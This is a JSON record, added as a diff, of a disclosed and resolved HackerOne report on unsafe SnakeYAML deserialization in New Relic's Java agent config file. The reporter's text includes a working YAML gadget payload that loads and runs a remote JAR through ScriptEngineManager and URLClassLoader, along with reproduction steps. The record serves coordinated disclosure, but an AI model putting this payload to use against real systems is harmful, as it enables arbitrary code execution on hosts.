@@ -1,0 +1,140 @@
+{
+  "id": 1109620,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA5NjIw",
+  "url": "https://hackerone.com/reports/1109620",
+  "title": "Untrusted deserialization issue when loading newrelic.yml file in Java agent leads to code execution on host",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-23T16:17:18.046Z",
+  "submitted_at": "2021-02-23T16:17:18.170Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "j0v",
+    "url": "/j0v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17011,
+    "url": "https://hackerone.com/newrelic",
+    "handle": "newrelic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "New Relic",
+      "twitter_handle": "newrelic",
+      "website": "https://newrelic.com",
+      "about": "New Relic's Coordinated Disclosure Program"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-06-28T13:00:14.824Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-06-21T13:30:57.843Z",
+  "team_member_agreed_on_going_public_at": "2021-06-28T13:00:14.675Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi team,\n\nThe New Relic Java agent is using SnakeYAML for deserialization of the `newrelic.yml` config file. SnakeYAML has a 'feature' which can lead to code execution, this is documented [here](https://bitbucket.org/asomov/snakeyaml/wiki/Documentation#markdown-header-constructors-representers-resolvers). With the `!!com.some.Class [\"arg1\", \"arg2\"]` notation it's possible to call Java code during the deserialization of a YAML file. \nIt's possible to combine this with a common known exploit using the `javax.script.ScriptEngineManager`, more info about this can be found in the paper and PoC tool of marshalsec, which can be found here: https://github.com/mbechler/marshalsec.\n\nI created a PoC locally and was able to execute code on my local machine. You can reproduce this with the following steps:\n\n* You can follow the steps here: https://github.com/jordyv/yaml-payload to create the necessary files for the exploit or used the files in the attachment. I added a ZIP file with all the files I created for my PoC as attachment to this report. My custom code is in `PocScriptEngineFactory.java` and as PoC I called `ping` to my localhost and started the MacOSX Calculator app.  I called the JAR file `poc.jar`.\n* Host the file locally, for example with `python3 -m http.server`, which starts a local webserver at port 8000\n* Update the newrelic.yml. I used the `common.labels` section for my payload, but it can be placed anywhere. \n\n```\ncommon: &default_settings\n  # ...\n  labels:\n    test: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ \"http://localhost:8000/poc.jar\" ]]]]\n```\n\n* Start a Java application with the `newrelic.jar` as agent; `java -javaagent:libs/newrelic.jar -jar build/libs/newrelic-agent-test-1.0-SNAPSHOT.jar`\n* In your HTTP server you'll notice a request to poc.jar and the code gets executed\n\n\nA video for this PoC: F1206678\nAll my files: F1206688\n\nThe ZIP file in the attachments also contains a README.md with the default steps.\n\n## Impact\n\nBy using SnakeYAML without any safe configuration it's possible for a malicious user to execute arbitrary code at the host by updating the newrelic.yml file. The actual arbitrary code can be hosted externally so at the local side it's only needed to place a payload with the URL of a JAR file in the agent configuration file.",
+  "bounty_amount": "768.0",
+  "formatted_bounty": "$768",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1206678,
+      "file_name": "poc_newrelic_agent_rce.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xnd6p5w9vw7rhxgw1uvfniyh0mu4?response-content-disposition=attachment%3B%20filename%3D%22poc_newrelic_agent_rce.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc_newrelic_agent_rce.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140616Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48f3776bc0cccf2c2fee6b241851dadb439fb013691c09661665d31eff429a30",
+      "file_size": 551676,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 1206688,
+      "file_name": "poc_files.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/po91c1lzd8kkj29lmowr7kxo10dv?response-content-disposition=attachment%3B%20filename%3D%22poc_files.zip%22%3B%20filename%2A%3DUTF-8%27%27poc_files.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4S26OA6W%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T140616Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBrwAoewzxY3bz1ssFSdtEyK39n4ige2HCt%2FqgWXMxo6AiEA8W9QZL7h8ed7oBtuSQFGPQDGjUswee0LimM2YHTA1jMqsgUIdhADGgwwMTM2MTkyNzQ4NDkiDIMSY8w9rHi0W5K3diqPBbjGizLrTlN6ZGbFF9LhBmPFJ1m5swtpZ7QtuQ1ecm6xRS32Vw6P29QnZ1nCvXxHRHo6hca4PRPlC%2F0SuWjzk0o8NKsd8UrMzywQ79MxoK3cqCgX8WV8kEyJZ1wthUKdW7fS3ASByTHh9EDJx35aAAaV%2FjyX21PDJbVpBrxSai%2BI8NCYDMrESdXzFg96JAx0%2FwVm%2BdX91kGoUyEspJy20Nir3f1bZWjC7MdtcCOSsjRRpflXb4gfaH%2BL1WT1rmstsNmGjj3W3W7TeYhR6pZtPFJdtb6k%2FghNKP4k29rXq2vgyXJX%2BVcohZ1zGAdsXYKgnKO2Y3m%2BPX7s9J%2BEwjIpNQnCTqqMY1fdtAuglpVQs9wOIOz5AsX%2F3fV3pu%2FvQSQRA8Du6Cj%2BeC4F1CXAi0KT8j%2B0b0OBcdCMFF7x0ZDWnp2IvcnhJbnULpfzrU3BcnLBK5G1w73sljokf7mqqRRV2mJeZ0Ksp5PbOgcxO2a9zF3%2F8KWFXZX25btNrQCkx2iy6DjaS4wWdbHTtaTyA9KPaMdPFCZK0C8QMd1EIcXXBkK42tdRHldBFv0Qtop0xhubZI7kmNI9gIAuHZhtoU%2F051v4TKLQUh2TAOI42M0%2BTEJLZph2o6AOjkFRtLNFt7YY1LhWRiyVjOtaBUNN8WQ3Qh3vWd2mGOGt3XUF8k06PdeLUGh8KHoKU7J50qkgwAmhpZgQn9UvombEZfjpL9rMdjKsr48SewAEp5ii613cBEjgvmV9GqfxRnaBt9%2BBnmZqq%2Bqdlb6QUuoAocNShZpYRVRCujWv0rbK5%2BJsewBiul9SD4qpCHDP0iLsOH3MbGI4L4Vl8HvxUyotCrHJVcTbSu85yQg3fmRmZR%2FKVxNQjZkwy8atrgY6sQF65KaBWFLOPDup9JZh9E6aRNnp6nOc2RJjfDBuEZqnqO%2FE0eIR6%2FMnB5jQvVkuHRSmXTStKVhFSTodnbxf6Jx%2FV%2Bb7oAvc4YN%2FjwysEYMAdJ7G1ipFcWKNk%2Fy8IJiu93NTzXgZ%2BUcmX9FJKhedbl1puxNoeG9%2FJnYsNGqtzqjFHuyw9oeW7ona11lhu%2Bwq%2BU434QKAOt%2FmsX3wWtY1amD8a%2F8TawrYCNcXdx0m%2F%2FsKhD8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0d083e3da6787a7f070474596e9d3339df9d14082e87c62431d27e48f57aac13",
+      "file_size": 15163935,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-07-21T13:30:58.043Z",
+  "allow_singular_disclosure_after": -80958918.77151674,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "osman1337",
+    "mr-medi",
+    "n1m0",
+    "bombon",
+    "sklnhunt",
+    "cryptoknight028",
+    "rreiss",
+    "ali",
+    "s_p_q_r",
+    "skavans",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 16327,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Java agent",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
